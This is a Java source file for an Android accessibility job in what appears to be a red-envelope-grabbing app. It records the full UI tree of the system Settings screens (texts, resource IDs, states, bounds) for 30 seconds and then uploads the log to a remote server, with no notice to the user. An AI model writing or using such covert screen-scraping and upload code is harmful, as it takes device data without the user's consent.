/**
 * 
 */
package accessibility.app;



import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.annotation.TargetApi;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import download.DownloadService;
import util.ConfigCt;
import util.Funcs;



/**
 * @author ASUS
 *
 */
public class UIinfo extends BaseAccessibilityJob  {
	private static UIinfo current;
	private static final String SETTING_PACKAGENAME="com.android.settings";
	StringBuffer mBuf = new StringBuffer();
	private static int mCount=1;
	public UIinfo(){
		//super(new String[]{PACKAGE_INSTALLER});
		super(new String[]{SETTING_PACKAGENAME});
	}
	public static synchronized UIinfo getUIinfo() {
		if(current == null) {
			current = new UIinfo();
		}
		return current;
	}
	@Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		//start() ;
	}
	@Override
	public void onStopJob() {
		super.onStopJob();
	}
	@Override
	public void onReceiveJob(AccessibilityEvent event) {
		super.onReceiveJob(event);
	   	if(!mIsEventWorking)return;
	   	if(!mIsTargetPackageName)return;
	   	//Log.i(TAG2, event.getPackageName().toString());
	   	if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED||eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED){
	   		AccessibilityNodeInfo nodeInfo = event.getSource();
	   		if (nodeInfo == null)return;
	   		nodeInfo=AccessibilityHelper.getRootNode(nodeInfo);
	   		if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
	   			addInfo("窗体改变----------------------------" + mCurrentUI);
	   		addInfo("窗体----------------------------" + mCurrentUI);
	   		addInfo("包：----------------------------" + event.getPackageName().toString());
	   		recycle(nodeInfo);
	   	}
	}
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){

   	
	}
	 /**开始工作30秒*/
    public void start() {
    	UIinfo.this.EventStart();
    	Handler handler= new Handler(); 
    	Runnable runnableBack  = new Runnable() {    
    		@Override    
    		public void run() {    
    			UIinfo.this.closeEventWorking();
    			sendInfo();
    		}    
    	};
    	handler.postDelayed(runnableBack, 30*1000);
    }
    //打印父子控件：
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
	public void recycle(AccessibilityNodeInfo info) {
  		if (info.getChildCount() == 0) {
  			//取信息addInfo();
  			//infos.put(getTime(), "child widget----------------------------" + info.getClassName());
  			addInfo("child widget----------------------------" + info.getClassName());
  			Log.i(ConfigCt.TAG, "child widget----------------------------" + info.getClassName());
  			//infos.put(getTime(),"Text：" + info.getText());
  			addInfo("Text：" + info.getText());
  			Log.i(ConfigCt.TAG, "Text：" + info.getText());
  			//infos.put(getTime(), "ResouceId:" + info.getViewIdResourceName());
  			addInfo( "ResouceId:" + info.getViewIdResourceName());
  			Log.i(ConfigCt.TAG, "ResouceId:" + info.getViewIdResourceName());
  			//infos.put(getTime(),"isClickable:" + info.isClickable());
  			addInfo("isClickable:" + info.isClickable());
  			Log.i(ConfigCt.TAG, "isClickable:" + info.isClickable());
  			//infos.put(getTime(),"isCheckable:" + info.isCheckable());
  			addInfo("isCheckable:" + info.isCheckable());
  			Log.i(ConfigCt.TAG, "isCheckable:" + info.isCheckable());
  			//infos.put(getTime(),"isChecked:" + info.isChecked());
  			addInfo("isChecked:" + info.isChecked());
  			Log.i(ConfigCt.TAG, "isChecked:" + info.isChecked());
  			//infos.put(getTime(),"getContentDescription：" + info.getContentDescription());
  			addInfo("getContentDescription：" + info.getContentDescription());
  			Log.i(ConfigCt.TAG, "getContentDescription：" + info.getContentDescription());
  			Rect outBounds=new Rect();
  			info.getBoundsInScreen(outBounds);
  			//infos.put(Funcs.milliseconds2String(System.currentTimeMillis()), "outBounds:" + outBounds);
  			addInfo( "outBounds:" + outBounds);
  			Log.i(ConfigCt.TAG, "outBounds:" + outBounds);
  		} else {
  			//infos.put(getTime(), "parent widget----------------------------" + info.getClassName());
  			addInfo( "parent widget----------------------------" + info.getClassName());
  			Log.i(ConfigCt.TAG, "parent widget----------------------------" + info.getClassName());
  			//infos.put(getTime(),"Text：" + info.getText());
  			addInfo("Text：" + info.getText());
  			Log.i(ConfigCt.TAG, "Text：" + info.getText());
  			//infos.put(getTime(),"getContentDescription：" + info.getContentDescription());
  			addInfo("getContentDescription：" + info.getContentDescription());
  			Log.i(ConfigCt.TAG, "getContentDescription：" + info.getContentDescription());
  			//infos.put(getTime(), "ResouceId:" + info.getViewIdResourceName());
  			addInfo("ResouceId:" + info.getViewIdResourceName());
  			Log.i(ConfigCt.TAG, "ResouceId:" + info.getViewIdResourceName());
  			//infos.put(getTime(),"isClickable:" + info.isClickable());
  			addInfo("isClickable:" + info.isClickable());
  			Log.i(ConfigCt.TAG, "isClickable:" + info.isClickable());
  			Rect outBounds=new Rect();
  			info.getBoundsInScreen(outBounds);
  			//infos.put(getTime(), "outBounds:" + outBounds);
  			addInfo("outBounds:" + outBounds);
  			Log.i(ConfigCt.TAG, "outBounds:" + outBounds);
  			for (int i = 0; i < info.getChildCount(); i++) {
  				if(info.getChild(i)!=null){
  					recycle(info.getChild(i));
  				}
  			}
  		}
    }
    /**
     * 添加信息
     *
     * @param ex
     * @return  返回文件名称,便于将文件传送到服务器
     */
    private void addInfo(String info) {
    	mBuf.append(getTime() + "----->" + info + "\r\n");
    }
    /**
     * 得到时间：
     *
     * @param ex
     * @return  返回文件名称,便于将文件传送到服务器
     */
    private String getTime() {
    	String time= Funcs.milliseconds2String(System.currentTimeMillis(),Funcs.DEFAULT_SDF2);
    	String s=String.valueOf(mCount);
    	switch(s.length()){
    	case 1:
    		s="00000"+s+"^";
    		break;
    	case 2:
    		s="0000"+s+"^";
    		break;
    	case 3:
    		s="000"+s+"^";
    		break;
    	case 4:
    		s="00"+s+"^";
    		break;
    	case 5:
    		s="0"+s+"^";
    		break;
    	default:
    		s=s+"^";
    	}
    	time=s+time;
    	mCount=mCount+1;
    	return time;
    }
    /**
     * 发送信息：
     *
     * @param ex
     * @return  返回文件名称,便于将文件传送到服务器
     */
    private void sendInfo() {
         Log.i(ConfigCt.TAG, "sb:" + mBuf.toString());
         DownloadService.SendInfo(context,mBuf.toString(),ConfigCt.appID+"-ui");
    }
}
